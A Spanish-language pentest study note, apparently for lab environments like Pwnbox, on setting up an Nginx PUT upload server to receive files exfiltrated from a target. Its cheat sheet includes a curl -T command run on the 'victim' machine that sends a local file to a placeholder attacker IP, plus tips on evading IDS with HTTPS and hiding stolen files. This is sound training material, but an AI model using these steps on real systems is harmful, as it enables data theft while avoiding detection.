---
tags:
  - filetransfer
  - nginx
---
## Conceptos Clave (TL;DR)

* La transferencia web es altamente efectiva porque los protocolos HTTP/HTTPS suelen estar permitidos a través de los firewalls.
* El uso de HTTPS cifra los datos en tránsito, previniendo que sistemas IDS detecten la transferencia de archivos sensibles o contraseñas en texto plano.
* Nginx es la alternativa recomendada frente a Apache para habilitar cargas (uploads), ya que la configuración es más simple y evita riesgos de seguridad severos, como la ejecución accidental de web shells por parte del módulo de PHP de Apache.
* Por defecto, Nginx no habilita el listado de directorios, lo que ayuda a ocultar los archivos exfiltrados en caso de que alguien navegue a la carpeta.

  
## Herramientas Clave

* **Nginx:** Servidor web utilizado para configurar de manera segura un punto de recepción de archivos (upload server).
* **cURL:** Herramienta de línea de comandos utilizada desde el objetivo para enviar el archivo mediante una petición HTTP PUT.
* **ss / ps:** Utilidades de Linux para identificar conflictos de puertos y procesos que impidan el inicio de Nginx.

  
## Metodología Paso a Paso

1. **Preparación del Entorno:** Se crea un directorio dedicado (idealmente con un nombre poco predecible) para recibir los archivos. Es imperativo cambiar el propietario del directorio a `www-data` para que Nginx tenga permisos de escritura.
2. **Creación del Virtual Host:** Se define un archivo de configuración en Nginx que especifica el puerto de escucha, el directorio raíz y habilita explícitamente `dav_methods PUT` para permitir la carga de archivos.
3. **Activación y Reinicio:** Se crea un enlace simbólico (symlink) del archivo de configuración hacia el directorio de sitios habilitados y se reinicia el servicio Nginx para aplicar los cambios.
4. **Ejecución de la Exfiltración:** Desde la máquina objetivo, se utiliza una herramienta nativa (como cURL) para enviar el archivo al servidor atacante.

  
## Cheat Sheet de Comandos
```bash
# Crea el directorio donde se almacenarán los archivos exfiltrados
sudo mkdir -p /var/www/uploads/<SECRET_DIR>

  
# Asigna la propiedad del directorio al usuario del servidor web
sudo chown -R www-data:www-data /var/www/uploads/<SECRET_DIR>
```

```nginx
# Crea el archivo de configuración de Nginx (ej. /etc/nginx/sites-available/upload.conf)

server {

    listen <ATTACKER_PORT>;

    location /<SECRET_DIR>/ {

        root    /var/www/uploads;

        dav_methods PUT;

    }

}
```

```bash
# Crea el symlink para habilitar la configuración en Nginx
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/

  
# Reinicia el servicio para aplicar la nueva configuración
sudo systemctl restart nginx.service

  
# Comando a ejecutar en la máquina VICTIMA para subir un archivo
# -T especifica el archivo local a enviar mediante el método PUT

curl -T <LOCAL_FILE_PATH> http://<ATTACKER_IP>:<ATTACKER_PORT>/<SECRET_DIR>/<DESTINATION_FILENAME>
```

  
## "Gotchas" y Troubleshooting

* **Conflictos de Puerto (Address already in use):** Si Nginx falla al reiniciar, revisa `/var/log/nginx/error.log`. Es común que el puerto 80 ya esté en uso (por ejemplo, en entornos como Pwnbox).

* **Identificar procesos en conflicto:** Utiliza `ss -lnpt | grep <PORT>` para encontrar el PID que ocupa el puerto y `ps -ef | grep <PID>` para identificar el servicio.

* **Configuración por defecto bloqueante:** Si hay un conflicto con otra instancia de Nginx en el puerto 80, puedes eliminar la configuración por defecto ejecutando `sudo rm /etc/nginx/sites-enabled/default`.

* **Validación post-configuración:** Siempre navega a `http://<ATTACKER_IP>/<SECRET_DIR>` sin especificar un archivo para asegurarte de que el listado de directorios no está habilitado y tus archivos exfiltrados permanecen ocultos.

* **Peligro de Apache:** Si por alguna razón debes usar Apache en lugar de Nginx, ten extremo cuidado con el módulo PHP, ya que si subes un archivo terminado en `.php`, Apache podría ejecutarlo en tu máquina atacante.